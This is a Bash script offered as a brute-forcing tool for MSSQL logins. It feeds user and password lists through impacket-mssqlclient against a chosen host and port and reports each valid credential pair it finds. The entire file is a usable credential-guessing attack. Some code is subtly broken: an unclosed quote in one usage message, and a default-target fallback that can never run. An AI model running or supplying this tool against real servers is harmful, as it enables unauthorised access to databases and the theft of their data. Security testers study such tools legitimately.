#!/bin/bash

# MSSQL brute-forcer using impacket-mssqlclient
# Usage:
#   ./mssql_brute.sh <target> -u=<user> -p=<password> -port=<port>

set -euo pipefail

# --------- Colors ----------
# ---- Base ----
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
BLUE="\033[0;34m"
MAGENTA="\033[0;35m"
CYAN="\033[0;36m"
GRAY="\033[0;90m"
# ---- Bright / Emphasis ----
BRED="\033[1;31m"
BGREEN="\033[1;32m"
BYELLOW="\033[1;33m"

RESET="\033[0m"

START_TIME=$(date +%s)

DEFAULT_TARGET="127.0.0.1"

TARGET=""
USER_INPUT=""
PASS_INPUT=""
SHOW_HELP=false
WIN_AUTH=false
PORT=1433

show_help() {
    echo -e "${BGREEN}Usage:${RESET}"
    echo
    echo -e "${YELLOW}Examples:${RESET}"
    echo "  mssql_brute.sh 10.10.10.10 -u='sa' -p='passwords.txt'           # Single user, password list"
    echo "  mssql_brute.sh 10.10.10.10 -u='users.txt' -p='pass123'          # User list, single password"
    echo "  mssql_brute.sh 10.10.10.10 -u='users.txt' -p='passwords.txt'    # User list, password list"
    echo
    echo -e "${BLUE}Note:${RESET} Uses impacket-mssqlclient "
    echo
    echo -e "Other Options: -h"
    echo -e "               --user='', --username=''"
    echo -e "               --pass='', --password=''"
    echo -e "               -port='',  --port='1433'"
    echo -e "               --win-auth, -windows-auth"
    #echo "Successful credentials are saved to: valid_mssql_creds.txt"
    exit 0
}

# --------- Argument Parsing ----------
for arg in "$@"; do
    case "$arg" in
        --user=*) USER_INPUT="${arg#*=}" ;;
        --username=*) USER_INPUT="${arg#*=}" ;;
        --pass=*) PASS_INPUT="${arg#*=}" ;;
        --password=*) PASS_INPUT="${arg#*=}" ;;
        -u=*) USER_INPUT="${arg#*=}" ;;
        -p=*) PASS_INPUT="${arg#*=}" ;;
        -port=*) PORT="${arg#*=}" ;;
        --port=*) PORT="${arg#*=}" ;;
        -h) SHOW_HELP=true ;;
        --win-auth) WIN_AUTH=true ;;
        -windows-auth) WIN_AUTH=true ;;
        *) [ -z "$TARGET" ] && TARGET="$arg" ;;
    esac
done

# Check for impacket-mssqlclient
if ! command -v impacket-mssqlclient &>/dev/null; then
    echo -e "${RED}[ERROR]${RESET} impacket-mssqlclient not found in PATH."
    echo "    You can install it with:"
    echo "    python3 -m pip install impacket"
    exit 1
fi

# Show help if requested
if [[ "$SHOW_HELP" == true ]]; then
    show_help
fi

if [[ -z "$TARGET" || -z "$USER_INPUT" || -z "$PASS_INPUT" ]]; then
    echo "Usage: mssql_brute.sh <IPv4 Target> -u='user|users.txt' -p='pass|passwords.txt'
    exit 1
fi

[ -z "$TARGET" ] && TARGET="$DEFAULT_TARGET" && echo -e "${BLUE}[i]${RESET} No IP provided — defaulting to $TARGET"

echo "[*] Target: $TARGET"
echo "[*] Username(s): $USER_INPUT"
echo "[*] Password(s): $PASS_INPUT"
echo "[*] Port:        $PORT"
if [[ "$WIN_AUTH" == true ]]; then
    echo "[*] Win Auth:        $WIN_AUTH"
fi
echo

# Convert user/pass into arrays
if [[ -f "$USER_INPUT" ]]; then
    mapfile -t USERS < "$USER_INPUT"
else
    USERS=("$USER_INPUT")
fi

if [[ -f "$PASS_INPUT" ]]; then
    mapfile -t PASSWORDS < "$PASS_INPUT"
else
    PASSWORDS=("$PASS_INPUT")
fi

for USER in "${USERS[@]}"; do
    for PASS in "${PASSWORDS[@]}"; do
        echo -e "[*] Trying: $USER : $PASS ... "
        
        if [[ "$WIN_AUTH" == true ]]; then
            OUTPUT=$(timeout 5 impacket-mssqlclient "$USER:$PASS@$TARGET" -port "$PORT" -windows-auth -command "SELECT 1"  2>&1)
        else
            OUTPUT=$(timeout 5 impacket-mssqlclient "$USER:$PASS@$TARGET" -port "$PORT" -command "SELECT 1"  2>&1)
        fi

        if echo "$OUTPUT" | grep -q "ACK: Result: 1"; then
            echo -e "    impacket-mssqlclient $USER:'$PASS'@$TARGET -port $PORT"
            echo -e "    ${GREEN}[+] SUCCESS:${RESET} $USER : $PASS"
            #echo "$USER:$PASS" >> valid_mssql_creds.txt
        elif echo "$OUTPUT" | grep -q "Login failed" || echo "$OUTPUT" | grep -q "Login timeout expired"; then
            echo -e "    ${RED}[-]${RESET} Failed"
        else
            echo "Error or Timeout"
        fi
    done
done

echo -e "\nBrute-force completed. $(date)"
#[[ -f valid_mssql_creds.txt ]] && echo "[+] Valid credentials saved to: valid_mssql_creds.txt"
